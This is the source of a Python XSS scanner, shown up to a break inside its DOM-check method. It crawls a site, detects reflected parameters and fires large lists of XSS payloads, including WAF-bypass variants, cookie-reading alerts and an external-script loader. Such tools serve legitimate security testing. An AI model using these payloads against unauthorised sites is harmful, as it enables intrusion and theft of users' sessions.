#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os, sys, re, json, random, string, urllib.parse, time
from datetime import datetime
from collections import deque
from html.parser import HTMLParser
import requests


class C:
    R = "\033[0m"; B = "\033[1m"; D = "\033[2m"
    RED = "\033[91m"; GRN = "\033[92m"; YEL = "\033[93m"
    BLU = "\033[94m"; MAG = "\033[95m"; CYN = "\033[96m"
    GRY = "\033[90m"; WHT = "\033[97m"


def clear():
    os.system('cls' if os.name == 'nt' else 'clear')


def pause(m="Enter"):
    try:
        input(f"\n  {C.GRY}[{m}]...{C.R}")
    except EOFError:
        pass


def new_marker(n=8):
    return "xXx" + "".join(random.choices(string.ascii_letters + string.digits, k=n)) + "xXx"


def build_url(base, param, value):
    p = urllib.parse.urlparse(base)
    q = urllib.parse.parse_qs(p.query, keep_blank_values=True)
    q[param] = [value]
    return urllib.parse.urlunparse(p._replace(query=urllib.parse.urlencode(q, doseq=True)))


def validate_url(url):
    try:
        p = urllib.parse.urlsplit(url)
        if p.scheme not in ("http", "https"):
            return False
        if not p.hostname:
            return False
        if p.username or p.password:
            return False
        if p.port is not None and not (1 <= p.port <= 65535):
            return False
        return True
    except ValueError:
        return False


def same_origin(url_a, url_b):
    try:
        a = urllib.parse.urlsplit(url_a)
        b = urllib.parse.urlsplit(url_b)
        return (
            a.scheme.lower() == b.scheme.lower()
            and (a.hostname or "").lower() == (b.hostname or "").lower()
            and a.port == b.port
        )
    except ValueError:
        return False


def valid_int(value, name, minimum=1, maximum=1000):
    try:
        value = int(value)
    except (TypeError, ValueError):
        raise ValueError(f"{name} must be an integer")
    if not minimum <= value <= maximum:
        raise ValueError(f"{name} must be between {minimum} and {maximum}")
    return value


_TAGS_HTML = ["svg","img","body","iframe","video","audio","details","marquee",
              "input","select","textarea","button","form","a","x","div","span","p",
              "h1","h2","track","source","object","embed","math","template","style",
              "table","td","tr","isindex","frame","frameset","col","base","area",
              "link","label","picture","main"]

_TAGS_SRC = ["img","svg","video","audio","source","track","iframe","embed",
             "object","input","script","link","meta","area","base"]

_EVENTS = ["onload","onerror","onfocus","onblur","onclick","onmouseover",
           "onmouseenter","onmouseleave","onpointerover","onpointerenter",
           "onpointerdown","ontoggle","onanimationstart","onanimationend",
           "ontransitionend","onbegin","onend","onstart","onfinish",
           "onpageshow","onhashchange","oninput","onchange","onsubmit",
           "onreset","oncontextmenu","ondrop","ondragover","onkeydown",
           "onkeyup","onkeypress","onwheel","onscroll","onresize",
           "onplay","onpause","onended","oncanplay","onvolumechange","onselect"]


def _gen_tag_event():
    return [(f"<{t} {e}=alert({{M}})>", f"{t}@{e}") for t in _TAGS_HTML for e in _EVENTS]


def _gen_tag_event_src():
    return [(f"<{t} src=x {e}=alert({{M}})>", f"{t}/src {e}") for t in _TAGS_SRC for e in _EVENTS]


def _gen_attr_dq():
    out = []
    for e in _EVENTS:
        out.append((f'" {e}="alert({{M}})', f"dq {e}"))
        out.append((f'" autofocus {e}="alert({{M}})', f"dq auto {e}"))
    return out


def _gen_attr_sq():
    out = []
    for e in _EVENTS:
        out.append((f"' {e}='alert({{M}})'", f"sq {e}"))
        out.append((f"' autofocus {e}='alert({{M}})'", f"sq auto {e}"))
    return out


def _gen_attr_unq():
    out = []
    for e in _EVENTS:
        out.append((f"/{e}=alert({{M}})", f"slash {e}"))
        out.append((f" {e}=alert({{M}})", f"space {e}"))
    return out


CURATED_HTML = [
    ("<script>alert({M})</script>", "script basic"),
    ("<script>alert(document.domain)</script>", "script domain"),
    ("<script>alert(document.cookie)</script>", "script cookie"),
    ("<script>alert{M}</script>", "script backtick"),
    ("<script>alert(/XSS/)</script>", "script regex"),
    ("<script>alert(/XSS/.source)</script>", "script regex2"),
    ("<script type=module>alert({M})</script>", "script module"),
    ("<script src=//xss.rocks/x.js></script>", "script ext"),
    ("<script src=data:,alert({M})></script>", "script data"),
    ("<script>eval(atob('YWxlcnQoMSk='))</script>", "script b64"),
    ("<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>", "script chr"),
    ("<script>[].constructor.constructor('alert(1)')()</script>", "script ctor"),
    ("<script>(()=>alert(1))()</script>", "script arrow"),
    ("<svg onload=alert({M})>", "svg onload"),
    ("<svg/onload=alert({M})>", "svg slash"),
    ("<svg><script>alert({M})</script>", "svg script"),
    ("<svg><g onload=alert({M})></g></svg>", "svg g"),
    ("<svg><animate onbegin=alert({M}) attributeName=x dur=1s>", "svg anim"),
    ("<svg><set attributeName=x to=y onbegin=alert({M})>", "svg set"),
    ("<svg><discard onbegin=alert({M})>", "svg disc"),
    ("<svg><circle onbegin=alert({M})>", "svg circ"),
    ("<svg><text onbegin=alert({M})>x</text>", "svg text"),
    ("<svg><path onbegin=alert({M})>", "svg path"),
    ("<svg><image href=javascript:alert({M})>", "svg image"),
    ("<svg><a xlink:href=javascript:alert({M})><text>x</text></a>", "svg a"),
    ("<svg><filter onbegin=alert({M})>", "svg flt"),
    ("<svg><pattern onbegin=alert({M})>", "svg pat"),
    ("<svg><mask onbegin=alert({M})>", "svg msk"),
    ("<svg><stop onbegin=alert({M})>", "svg stop"),
    ("<svg><view onbegin=alert({M})>", "svg view"),
    ("<svg><handler xmlns:ev=http://www.w3.org/2001/xml-events ev:event=load>alert(1)</handler></svg>", "svg handler"),
    ("<svg><style>{font-family:'</style><img src=x onerror=alert(1)>'}", "svg style"),
    ("<svg><foreignObject><iframe srcdoc=&lt;script&gt;alert(1)&lt;/script&gt;></iframe></foreignObject></svg>", "svg fO"),
    ("<img src=x onerror=alert({M})>", "img onerror"),
    ("<img/src=x/onerror=alert({M})>", "img slash"),
    ("<img src=x onerror=alert{M}>", "img backtick"),
    ("<img src=x onerror=alert(String.fromCharCode(88,83,83))>", "img chr"),
    ("<img src=x onerror=eval(atob('YWxlcnQoMSk='))>", "img b64"),
    ("<img src=x:alert(1) onerror=eval(src)>", "img eval"),
    ("<img src=x onerror=top'al'+'ert'>", "img brk"),
    ("<img src onerror=alert(1)>", "img nov"),
    ("<img src=x onerror=[].constructor.constructor('alert(1)')()>", "img ctor"),
    ("<body onload=alert({M})>", "body ld"),
    ("<body/onload=alert({M})>", "body sl"),
    ("<body onpageshow=alert({M})>", "body ps"),
    ("<body onhashchange=alert({M})>", "body hc"),
    ("<html onmouseover=alert({M})>", "html mo"),
    ("<iframe src=javascript:alert({M})>", "ifr js"),
    ("<iframe srcdoc=<script>alert({M})</script>>", "ifr sd"),
    ("<iframe onload=alert({M})>", "ifr ld"),
    ("<iframe/src=javascript:alert(1)>", "ifr sl"),
    ("<iframe src='data:text/html,<script>alert(1)</script>'>", "ifr d"),
    ("<details open ontoggle=alert({M})>", "det"),
    ("<details ontoggle=alert({M}) open>", "det2"),
    ("<marquee onstart=alert({M})>", "marq s"),
    ("<marquee onfinish=alert({M})>", "marq f"),
    ("<video src=x onerror=alert({M})>", "vid"),
    ("<video><source onerror=alert({M})>", "vid s"),
    ("<video poster=x onerror=alert(1)>", "vid p"),
    ("<audio src=x onerror=alert({M})>", "aud"),
    ("<input autofocus onfocus=alert({M})>", "inp"),
    ("<input onfocus=alert({M}) autofocus>", "inp 2"),
    ("<select autofocus onfocus=alert({M})>", "sel"),
    ("<textarea autofocus onfocus=alert({M})>", "tarea"),
    ("<keygen autofocus onfocus=alert({M})>", "key"),
    ("<input type=image src=x onerror=alert(1)>", "inp img"),
    ("<button formaction=javascript:alert({M})>x", "btn"),
    ("<input type=submit formaction=javascript:alert({M})>", "inp sub"),
    ("<isindex type=image src=1 onerror=alert(1)>", "isidx"),
    ("<object data=javascript:alert({M})>", "obj"),
    ("<object data='data:text/html,<script>alert(1)</script>'>", "obj d"),
    ("<embed src=javascript:alert({M})>", "emb"),
    ("<embed src='data:text/html,<script>alert(1)</script>'>", "emb d"),
    ("<math><mtext><script>alert({M})</script></mtext></math>", "math"),
    ("<math href=javascript:alert({M})>x</math>", "math h"),
    ("<template><script>alert({M})</script></template>", "tpl"),
    ("<meta http-equiv=refresh content='0;url=javascript:alert({M})'>", "meta"),
    ("<base href=javascript:alert({M})//>", "base"),
    ("<link rel=stylesheet href=javascript:alert(1)>", "link"),
    ("<a href=javascript:alert({M})>x</a>", "anch"),
    ("<form action=javascript:alert({M})><input type=submit>", "frm"),
    ("<x onclick=alert({M})>x</x>", "xclk"),
    ("<x onmouseover=alert({M})>x</x>", "xmo"),
    ("<frameset onload=alert({M})>", "fs"),
    ("<plaintext><script>alert(1)</script>", "plain"),
    ("<xmp><script>alert(1)</script></xmp>", "xmp"),
    ("<noscript><p title=</noscript><img src=x onerror=alert(1)>>", "ns"),
    ("<style>@import 'javascript:alert(1)';</style>", "sti"),
    ("<title><img src=x onerror=alert(1)></title>", "timg"),
    ("<xss id=x tabindex=1 onfocus=alert(1)></xss>", "cf"),
    ("<svg><style><img src=x onerror=alert(1)></style></svg>", "svg sty"),
    ("<svg><title><img src=x onerror=alert(1)></title></svg>", "svg tt"),
]

CURATED_DQ = [
    ('"><script>alert({M})</script>', "dq cls scr"),
    ('"><svg onload=alert({M})>', "dq cls svg"),
    ('"><img src=x onerror=alert({M})>', "dq cls img"),
    ('"><iframe src=javascript:alert({M})>', "dq cls ifr"),
    ('"><details open ontoggle=alert({M})>', "dq cls det"),
    ('"><body onload=alert({M})>', "dq cls body"),
    ('"><script>alert({M})//', "dq cmt"),
    ('&quot;&gt;<script>alert({M})</script>', "dq esc"),
    ('&#34;&#62;<script>alert({M})</script>', "dq ent"),
    ('" onpointerenter="alert({M})', "dq pe"),
    ('" onpointerdown="alert({M})', "dq pd"),
    ('" oncontextmenu="alert({M})', "dq cm"),
    ('" ondrop="alert({M})', "dq drop"),
    ('" onwheel="alert({M})', "dq wh"),
    ('" onscroll="alert({M})', "dq sc"),
    ('" onanimationstart="alert({M})" style="animation-name:x', "dq anim"),
    ('" ontransitionend="alert({M})" style="transition:all 1s', "dq tr"),
    ('" onbeforetoggle="alert({M})" popover="x', "dq pop"),
]

CURATED_SQ = [
    ("'><script>alert({M})</script>", "sq cls scr"),
    ("'><svg onload=alert({M})>", "sq cls svg"),
    ("'><img src=x onerror=alert({M})>", "sq cls img"),
    ("'><iframe src=javascript:alert({M})>", "sq cls ifr"),
    ("'><details open ontoggle=alert({M})>", "sq cls det"),
    ('&#39;&gt;<script>alert({M})</script>', "sq esc"),
    ("' onpointerenter='alert({M})", "sq pe"),
    ("' oncontextmenu='alert({M})", "sq cm"),
    ("' onscroll='alert({M})", "sq sc"),
]

CURATED_UNQ = [
    ("\x20onmouseover=alert({M})", "hex sp"),
    ("\tonmouseover=alert({M})", "tab"),
    ("\nonmouseover=alert({M})", "nl"),
    ("\ronmouseover=alert({M})", "cr"),
    ("/autofocus/onfocus=alert({M})//", "multi sl"),
    ("%20onmouseover=alert({M})", "url sp"),
    ("&#10;onmouseover=alert({M})", "ent nl"),
    ("&#9;onmouseover=alert({M})", "ent tab"),
]

CURATED_JS = [
    ("';alert({M})//", "sq cls"),
    ('";alert({M})//', "dq cls"),
    ("</script><script>alert({M})</script>", "cls reop"),
    ("</script><svg onload=alert({M})>", "cls svg"),
    ("</script><img src=x onerror=alert({M})>", "cls img"),
    ("1;alert({M})", "semi"),
    ("1);alert({M});(", "paren"),
    ("${alert({M})}", "tmpl"),
    ("${alert({M})}", "tmpl lit"),
    ("\u0027;alert({M})//", "uni q"),
    ("\x27;alert({M})//", "hex q"),
    ("\x3c/script\x3e<script>alert({M})</script>", "hex tag"),
    ("eval(atob('YWxlcnQoMSk='))", "b64"),
    ("window'al'+'ert'", "brk"),
    ("[].constructor.constructor('alert(1)')()", "ctor"),
    ("(function(){alert(1)})()", "iife"),
    ("setTimeout('alert(1)',0)", "sto"),
]

CURATED_CSS = [
    ("</style><script>alert({M})</script>", "cls"),
    ("</style><svg onload=alert({M})>", "cls svg"),
    ("expression(alert({M}))", "expr"),
    ("url(javascript:alert({M}))", "url js"),
    ("@import 'javascript:alert({M})';", "imp"),
]

CURATED_COMMENT = [
    ("--><script>alert({M})</script>", "cls"),
    ("--> <svg onload=alert({M})>", "cls svg"),
    ("--!><script>alert({M})</script>", "edge"),
    ("--!>--><script>alert({M})</script>", "dbl"),
]

CURATED_URL = [
    ("javascript:alert({M})", "js"),
    ("JaVaScRiPt:alert({M})", "mix"),
    ("data:text/html,<script>alert({M})</script>", "data"),
    ("vbscript:msgbox({M})", "vbs"),
]

CURATED_POLY = [
    ("jaVasCript:/-//*\\/'/\"//**/(/* /oNcliCk=alert() )//%0D%0A//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e", "poly1"),
    ("'\">]]>/</script></script><svg onload=alert(1)>", "poly2"),
    ("'\"--></title></style></textarea></script></xmp><svg/onload='+/\\'/+alert(1)//'>", "poly3"),
]

CURATED_WAF = [
    ("<ScRiPt>alert({M})</ScRiPt>", "case"),
    ("<scr<script>ipt>alert({M})</scr</script>ipt>", "nested"),
    ("<scr\x00ipt>alert({M})</script>", "null"),
    ("<img\tsrc=x\tonerror=alert({M})>", "tab"),
    ("<img\nsrc=x\nonerror=alert({M})>", "nl"),
    ("<script>al\u0065rt({M})</script>", "uni"),
    ("<img src=x onerror=\\x61lert({M})>", "hex c"),
    ("<scri<!-- -->pt>alert({M})</scri<!-- -->pt>", "cmt spl"),
    ("<img src=x/**/onerror=alert({M})>", "css cmt"),
]


def build_db(mode="fast"):
    db = {}
    if mode == "fast":
        db["html"]          = CURATED_HTML
        db["attr_double"]   = CURATED_DQ
        db["attr_single"]   = CURATED_SQ
        db["attr_unquoted"] = CURATED_UNQ
        db["js"]            = CURATED_JS
        db["css"]           = CURATED_CSS
        db["comment"]       = CURATED_COMMENT
        db["url_href"]      = CURATED_URL
        db["polyglot"]      = CURATED_POLY
        db["waf_bypass"]    = CURATED_WAF
    elif mode == "normal":
        tt = _TAGS_HTML[:10]; te = _EVENTS[:10]; ts = _TAGS_SRC[:8]
        db["html"] = CURATED_HTML + \
            [(f"<{t} {e}=alert({{M}})>", f"{t}@{e}") for t in tt for e in te] + \
            [(f"<{t} src=x {e}=alert({{M}})>", f"{t}/src {e}") for t in ts for e in te]
        db["attr_double"]   = CURATED_DQ + [(f'" {e}="alert({{M}})', f"dq {e}") for e in te]
        db["attr_single"]   = CURATED_SQ + [(f"' {e}='alert({{M}})'", f"sq {e}") for e in te]
        db["attr_unquoted"] = CURATED_UNQ + [(f"/{e}=alert({{M}})", f"slash {e}") for e in te]
        db["js"]            = CURATED_JS
        db["css"]           = CURATED_CSS
        db["comment"]       = CURATED_COMMENT
        db["url_href"]      = CURATED_URL
        db["polyglot"]      = CURATED_POLY
        db["waf_bypass"]    = CURATED_WAF
    else:
        db["html"] = CURATED_HTML + _gen_tag_event() + _gen_tag_event_src()
        db["attr_double"]   = CURATED_DQ + _gen_attr_dq()
        db["attr_single"]   = CURATED_SQ + _gen_attr_sq()
        db["attr_unquoted"] = CURATED_UNQ + _gen_attr_unq()
        db["js"]            = CURATED_JS
        db["css"]           = CURATED_CSS
        db["comment"]       = CURATED_COMMENT
        db["url_href"]      = CURATED_URL
        db["polyglot"]      = CURATED_POLY
        db["waf_bypass"]    = CURATED_WAF
    for ctx in db:
        seen, uniq = set(), []
        for p, d in db[ctx]:
            if p not in seen:
                seen.add(p); uniq.append((p, d))
        db[ctx] = uniq
    return db


_ALL_MODES = {m: build_db(m) for m in ("fast", "normal", "deep")}
_MODE_COUNTS = {m: sum(len(v) for v in db.values()) for m, db in _ALL_MODES.items()}


DOM_SOURCES = ["location.hash","location.search","location.href","location.pathname",
               "document.URL","document.documentURI","document.referrer",
               "document.baseURI","window.name","document.cookie","postMessage",
               "history.pushState"]

DOM_SINKS = ["innerHTML","outerHTML","insertAdjacentHTML","document.write",
             "document.writeln","eval(","setTimeout(","setInterval(","Function(",
             "execScript(","jQuery.html(","$.html(","jQuery.append(","$.append(",
             "jQuery.prepend(","$.prepend(","jQuery.after(","$.after(",
             "jQuery.before(","$.before(","jQuery.parseHTML(","$.parseHTML("]


class LinkParser(HTMLParser):
    def __init__(self):
        super().__init__(convert_charrefs=True)
        self.links = []

    def handle_starttag(self, tag, attrs):
        attrs = dict(attrs)
        if tag == "a":
            href = attrs.get("href")
            if href:
                self.links.append(href)
        elif tag == "link":
            href = attrs.get("href")
            if href:
                self.links.append(href)


def detect_context(body, marker):
    idx = body.find(marker)
    if idx == -1:
        return None
    before = body[max(0, idx-1500):idx].lower()
    if before.rfind("<!--") > before.rfind("-->"):
        return "comment"
    if before.rfind("<script") > before.rfind("</script"):
        return "js"
    if before.rfind("<style") > before.rfind("</style"):
        return "css"
    lt, gt = before.rfind("<"), before.rfind(">")
    if lt > gt:
        chunk = before[lt:]
        if chunk.count('"') % 2 == 1:
            return "attr_double"
        if chunk.count("'") % 2 == 1:
            return "attr_single"
        eq = chunk.rfind("=")
        if eq > -1 and not chunk[eq+1:].startswith(('"', "'")):
            return "attr_unquoted"
        return "html"
    return "html"


def is_reflected_raw(body, marker):
    return marker in body


class HTTP:
    def __init__(self, timeout=8, proxy=None, cookies=None, headers=None):
        self.s = requests.Session()
        self.timeout = timeout
        self.proxy = proxy
        self.max_response_size = 2 * 1024 * 1024
        self.s.headers.update({
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/126.0 Safari/537.36",
            "Accept": "text/html,application/xhtml+xml,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.9",
            "Connection": "close",
        })
        if headers:
            self.s.headers.update(headers)
        if cookies:
            self.s.cookies.update(cookies)

    def req(self, method, url, data=None, headers=None, timeout=None):
        method = str(method).upper()
        if method not in ("GET", "HEAD"):
            raise ValueError(f"Unsupported read-only method: {method}")

        request_timeout = self.timeout if timeout is None else timeout
        if request_timeout <= 0:
            raise ValueError("timeout must be greater than zero")

        kw = {"timeout": request_timeout, "allow_redirects": True}
        if self.proxy:
            kw["proxies"] = {"http": self.proxy, "https": self.proxy}
        if headers:
            kw["headers"] = headers

        response = self.s.request(method, url, **kw)
        if len(response.content) > self.max_response_size:
            raise ValueError("Response exceeds maximum allowed size")
        return response


class Progress:
    def __init__(self, total, label=""):
        self.total = total
        self.i = 0
        self.start = time.time()
        self.label = label
        self.width = 30

    def tick(self):
        if self.i >= self.total:
            return
        self.i += 1
        if self.i % 5 == 0 or self.i == self.total:
            self._draw()

    def _draw(self):
        frac = min(1.0, self.i / self.total) if self.total > 0 else 1.0
        filled = int(self.width * frac)
        bar = "█" * filled + "░" * (self.width - filled)
        elapsed = time.time() - self.start
        rate = self.i / elapsed if elapsed > 0 else 0
        eta = (self.total - self.i) / rate if rate > 0 else 0
        sys.stdout.write(
            f"\r    {C.GRY}[{bar}]{C.R} "
            f"{C.CYN}{self.i}/{self.total}{C.R} "
            f"({int(frac*100)}%) "
            f"{C.GRY}{rate:.0f}/s  ETA {int(eta)}s{C.R}   "
        )
        sys.stdout.flush()

    def done(self):
        sys.stdout.write("\r" + " " * 120 + "\r")
        sys.stdout.flush()
        return time.time() - self.start


class Crawler:
    SKIP_EXT = ('.jpg','.jpeg','.png','.gif','.svg','.webp','.bmp','.ico',
                '.css','.woff','.woff2','.ttf','.eot','.otf','.mp4','.mp3',
                '.webm','.pdf','.zip','.rar','.7z','.tar','.gz','.doc','.docx',
                '.xls','.xlsx','.ppt','.pptx','.exe','.dmg')
    SKIP_PATHS = ('logout','signout','logoff','delete','remove','destroy',
                  'unsubscribe','cancel-account')

    def __init__(self, http, start_url, max_pages=30, max_depth=2, base_origin=None):
        self.http = http
        self.start_url = start_url.rstrip("/") if start_url.endswith("/") else start_url
        p = urllib.parse.urlparse(start_url)
        self.origin = base_origin or f"{p.scheme}://{p.netloc}"
        self.max_pages = max_pages
        self.max_depth = max_depth
        self.visited = set()
        self.discovered_urls = set()
        self.forms = []
        self.js_urls = set()
        self.api_paths = set()

    def _normalize(self, base, href):
        if not href:
            return None
        href = href.strip()
        try:
            u = urllib.parse.urljoin(base, href)
            p = urllib.parse.urlsplit(u)
            if p.scheme not in ("http", "https"):
                return None
            if not p.hostname:
                return None
            if not same_origin(u, self.origin):
                return None
            return urllib.parse.urlunsplit((p.scheme, p.netloc, p.path or "/", p.query, ""))
        except (ValueError, TypeError):
            return None

    def _should_visit(self, url):
        try:
            p = urllib.parse.urlsplit(url)
            path = p.path.lower()
            if path.endswith(self.SKIP_EXT):
                return False
            if any(s in path for s in self.SKIP_PATHS):
                return False
            return True
        except ValueError:
            return False

    def _extract_from_html(self, html, page_url):
        links = set()
        try:
            parser = LinkParser()
            parser.feed(html)
            for href in parser.links:
                u = self._normalize(page_url, href)
                if u and self._should_visit(u):
                    links.add(u)
        except Exception:
            pass

        forms = []
        try:
            for form_match in re.finditer(r'<form[^>]*>(.*?)</form>', html, re.S | re.I):
                form_html = form_match.group(0)
                a_m = re.search(r'action=["\']([^"\']*)["\']', form_html, re.I)
                m_m = re.search(r'method=["\'](\w+)["\']', form_html, re.I)
                action = self._normalize(page_url, (a_m.group(1) if a_m else "") or page_url)
                method = (m_m.group(1) if m_m else "GET").upper()
                if not action:
                    continue
                inputs = []
                for inp in re.finditer(r'<input[^>]+>', form_html, re.I):
                    name_m = re.search(r'name=["\']([^"\']+)["\']', inp.group(0), re.I)
                    if name_m:
                        name = name_m.group(1)
                        if name.lower() not in ("submit","button","_token","csrf","csrf_token","_method"):
                            inputs.append(name)
                for ta in re.finditer(r'<textarea[^>]+name=["\']([^"\']+)["\']', form_html, re.I):
                    inputs.append(ta.group(1))
                if inputs:
                    forms.append({"action": action, "method": method,
                                  "inputs": inputs, "page": page_url})
        except Exception:
            pass

        return links, forms

    def _extract_from_js(self, js, js_url):
        paths = set()
        pats = [
            r'["\'](/[a-zA-Z0-9_\-./?=&%:]{3,120})["\']',
            r'fetch\s*\(\s*["\']([^"\']{3,120})["\']',
            r'\.(?:get|post|put|delete|patch|ajax)\s*\(\s*["\']([^"\']{3,120})["\']',
            r'url\s*:\s*["\']([^"\']{3,120})["\']',
            r'baseURL\s*[:=]\s*["\']([^"\']{3,120})["\']',
        ]
        for pat in pats:
            for m in re.finditer(pat, js):
                u = m.group(1)
                if u.startswith("http"):
                    if same_origin(u, self.origin):
                        paths.add(u)
                elif u.startswith("/") and not u.startswith("//"):
                    paths.add(self.origin + u)
        return paths

    def crawl(self):
        queue = deque([(self.start_url, 0)])
        self.discovered_urls.add(self.start_url)
        pages_crawled = 0

        while queue and pages_crawled < self.max_pages:
            url, depth = queue.popleft()
            key = url.split("#")[0]
            if key in self.visited:
                continue
            self.visited.add(key)

            try:
                r = self.http.req("GET", url)
            except Exception:
                continue

            if not 200 <= r.status_code < 300:
                continue
            if not same_origin(r.url, self.origin):
                continue
            content_type = r.headers.get("Content-Type", "").lower()
            if "text/html" not in content_type:
                continue

            html = r.text
            pages_crawled += 1

            links, forms = self._extract_from_html(html, url)
            self.forms.extend(forms)

            for u in links:
                self.discovered_urls.add(u)
                if depth < self.max_depth and u not in self.visited:
                    queue.append((u, depth + 1))

            for m in re.finditer(r'<script[^>]+src=["\']([^"\']+\.js[^"\']*)["\']', html, re.I):
                js_url = self._normalize(url, m.group(1))
                if js_url and js_url not in self.js_urls:
                    self.js_urls.add(js_url)

        for js_url in self.js_urls:
            try:
                r = self.http.req("GET", js_url)
                if not same_origin(r.url, self.origin):
                    continue
                js = r.text
                paths = self._extract_from_js(js, js_url)
                self.api_paths.update(paths)
                for p in paths:
                    self.discovered_urls.add(p)
            except Exception:
                continue

        return {
            "pages": pages_crawled,
            "urls": list(self.discovered_urls),
            "forms": self.forms,
            "js_files": list(self.js_urls),
            "api_paths": list(self.api_paths),
        }


class XSSScanner:
    MAX_CONSECUTIVE_FAILS = 8

    def __init__(self, cfg):
        self.cfg = cfg
        self.url = cfg["url"]

        if not validate_url(self.url):
            raise ValueError(f"Invalid URL: {self.url}")

        self.mode = str(cfg.get("mode", "fast")).lower()
        if self.mode not in _ALL_MODES:
            raise ValueError(f"Invalid scan mode: {self.mode}")

        self.timeout = valid_int(cfg.get("timeout", 8), "timeout", 1, 120)
        self.crawl_pages = valid_int(cfg.get("crawl_pages", 30), "crawl_pages", 1, 500)
        self.crawl_depth = valid_int(cfg.get("crawl_depth", 2), "crawl_depth", 0, 10)
        default_targets = 20 if self.mode == "fast" else (50 if self.mode == "normal" else 200)
        self.max_targets = valid_int(cfg.get("max_targets", default_targets),
                                     "max_targets", 1, 500)

        self.http = HTTP(timeout=self.timeout, proxy=cfg.get("proxy"),
                         cookies=cfg.get("cookies"), headers=cfg.get("headers"))

        self.payloads = _ALL_MODES[self.mode]
        self.param = cfg.get("param")
        self.test_csp = bool(cfg.get("test_csp", True))
        self.enable_header_tests = bool(cfg.get("test_headers", False))
        self.test_dom = bool(cfg.get("test_dom", True))

        self.findings, self.attempted, self.checked = [], 0, 0
        self.errors, self.warnings, self.inconclusive = [], [], []
        self.stopped = False
        self.crawl_result = None

    def send_val(self, url, param, value, method="GET", extra=None, headers=None):
        if method.upper() not in ("GET", "HEAD"):
            raise ValueError(f"Read-only mode: cannot send {method}")
        return self.http.req("GET", build_url(url, param, value), headers=headers)

    def discover(self):
        print(f"\n{C.BLU}[*] Discovery phase{C.R}")
        print(f"  {C.GRY}crawl max {self.crawl_pages} pages, depth {self.crawl_depth}{C.R}")
        cr = Crawler(self.http, self.url,
                     max_pages=self.crawl_pages, max_depth=self.crawl_depth)
        result = cr.crawl()
        self.crawl_result = result
        print(f"  {C.GRN}✓{C.R} pages crawled: {result['pages']}")
        print(f"  {C.GRN}✓{C.R} URLs discovered: {len(result['urls'])}")
        print(f"  {C.GRN}✓{C.R} JS files: {len(result['js_files'])}")
        print(f"  {C.GRN}✓{C.R} API paths in JS: {len(result['api_paths'])}")
        print(f"  {C.GRN}✓{C.R} forms found: {len(result['forms'])}")

        targets, seen_params = [], set()
        for u in result["urls"]:
            p = urllib.parse.urlparse(u)
            if not p.query:
                continue
            q = urllib.parse.parse_qs(p.query, keep_blank_values=True)
            for prm in q.keys():
                key = (u.split("?")[0], prm)
                if key in seen_params:
                    continue
                seen_params.add(key)
                targets.append({"type": "url_param", "url": u, "param": prm, "method": "GET"})

        for f in result["forms"]:
            for inp in f["inputs"]:
                targets.append({"type": "form_param", "url": f["action"],
                                "param": inp, "method": f["method"],
                                "extra": {i: "test" for i in f["inputs"]}})

        print(f"  {C.GRN}✓{C.R} test targets: {len(targets)}")
        return targets

    def run_param(self, target):
        marker = new_marker()
        try:
            r0 = self.send_val(target["url"], target["param"], marker,
                               method=target["method"], extra=target.get("extra"))
        except requests.exceptions.RequestException as e:
            self.errors.append({"url": target["url"], "error": str(e),
                                "time": datetime.now().isoformat()})
            return
        except Exception as e:
            self.errors.append({"url": target["url"], "error": str(e),
                                "time": datetime.now().isoformat()})
            return

        self.checked += 1
        ctx = detect_context(r0.text, marker)
        if not ctx:
            print(f"    {C.GRY}no reflection{C.R}")
            return
        print(f"    {C.CYN}reflected [{ctx}]{C.R}")

        contexts = [ctx]
        if ctx != "html":
            contexts.append("html")
        if self.mode == "deep" and ctx not in ("polyglot", "waf_bypass"):
            contexts += ["polyglot", "waf_bypass"]

        payload_list, seen = [], set()
        for c in contexts:
            for tpl, desc in self.payloads.get(c, []):
                p = tpl.replace("{M}", marker)
                if p not in seen:
                    seen.add(p)
                    payload_list.append((p, c, desc))

        prog = Progress(len(payload_list))
        fails = 0
        try:
            for p, c, desc in payload_list:
                if self.stopped:
                    break
                self.attempted += 1
                try:
                    r = self.send_val(target["url"], target["param"], p,
                                      method=target["method"], extra=target.get("extra"))
                    fails = 0
                    if is_reflected_raw(r.text, p):
                        prog.done()
                        url = (build_url(target["url"], target["param"], p)
                               if target["method"].upper() == "GET" else target["url"])
                        self.findings.append({
                            "type": "reflected-input",
                            "param": target["param"],
                            "url": url,
                            "method": target["method"],
                            "context": ctx,
                            "payload": p,
                            "desc": desc,
                            "source": target["type"],
                            "status_code": r.status_code,
                            "content_type": r.headers.get("Content-Type", ""),
                            "final_url": r.url,
                        })
                        print(f"    {C.GRN}{C.B}✓ reflected-input{C.R} — {desc}")
                        print(f"      {C.MAG}{p[:100]}{C.R}")
                        return
                    prog.tick()
                except (requests.exceptions.Timeout,
                        requests.exceptions.ConnectionError) as e:
                    fails += 1; prog.tick()
                    self.errors.append({"url": target["url"], "error": str(e),
                                        "time": datetime.now().isoformat()})
                except requests.exceptions.RequestException as e:
                    fails += 1; prog.tick()
                    self.errors.append({"url": target["url"], "error": str(e),
                                        "time": datetime.now().isoformat()})
                except Exception as e:
                    fails += 1; prog.tick()
                    self.errors.append({"url": target["url"], "error": str(e),
                                        "time": datetime.now().isoformat()})
                if fails >= self.MAX_CONSECUTIVE_FAILS:
                    prog.done()
                    print(f"    {C.YEL}[!] {fails} fails — skipping{C.R}")
                    return
            prog.done()
        except KeyboardInterrupt:
            prog.done()
            print(f"\n    {C.YEL}[!] aborted{C.R}")
            self.stopped = True

    def check_csp(self):
        try:
            r = self.http.req("GET", self.url)
        except Exception as e:
            self.errors.append({"url": self.url, "error": str(e),
                                "time": datetime.now().isoformat()})
            return
        csp = r.headers.get("Content-Security-Policy", "")
        if not csp:
            self.findings.append({
                "type": "csp-missing", "param": "Header", "context": "-",
                "payload": "-",
                "desc": "Content-Security-Policy header is missing; configuration review required",
                "url": self.url, "method": "GET", "source": "header",
                "status_code": r.status_code,
                "content_type": r.headers.get("Content-Type", ""),
                "final_url": r.url,
            })
            print(f"  {C.RED}⚠ No CSP{C.R}")
        else:
            print(f"  {C.GRN}CSP: {csp[:80]}{C.R}")

    def check_dom(self):
        try:
            r = self.http.req("GET", self.url)
        except Exception as e:
            self.errors.append({"url": self.url, "error": str(e),
                                "time": datetime.now().isoformat()})
